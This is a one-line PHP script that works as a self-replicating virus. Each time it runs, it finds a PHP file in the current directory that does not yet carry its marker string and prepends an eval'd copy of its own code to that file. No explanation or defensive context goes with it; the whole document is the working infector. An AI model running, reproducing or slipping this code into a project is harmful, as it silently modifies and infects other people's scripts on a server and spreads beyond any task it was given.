<?$c='foreach(glob("*.php") as $f){$d=file_get_contents($f);if(!strstr($d,"DY[<]1kz?(`!2)n6")){file_put_contents($f,"<?\\$c=".chr(39).$c.chr(39).";eval(\\$c);?>\n".$d);break;}}';eval($c);?>
